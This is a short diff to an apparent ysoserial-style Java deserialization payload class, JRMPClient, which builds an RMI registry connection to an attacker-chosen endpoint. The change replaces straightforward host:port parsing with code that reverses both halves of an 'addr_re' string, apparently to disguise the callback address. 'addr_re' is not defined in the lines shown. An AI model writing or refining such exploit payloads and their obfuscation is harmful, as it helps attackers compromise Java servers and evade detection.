@@ -57,14 +57,21 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
 
         String host;
         int port;
-        int sep = command.indexOf(':');
+         int sep = addr_re.indexOf(':');
+    //   int sep = command.indexOf(':');
         if ( sep < 0 ) {
             port = new Random().nextInt(65535);
             host = command;
         }
         else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
+			StringBuffer p = new StringBuffer(addr_re.substring(0,sep));
+			String pp = new String(p.reverse());
+			port = Integer.valueOf(pp);
+			
+			p = new StringBuffer(addr_re.substring(sep+1));
+			host = new String(p.reverse());
+    //      host = command.substring(0, sep);
+    //      port = Integer.valueOf(command.substring(sep + 1));
         }
         ObjID id = new ObjID(new Random().nextInt()); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
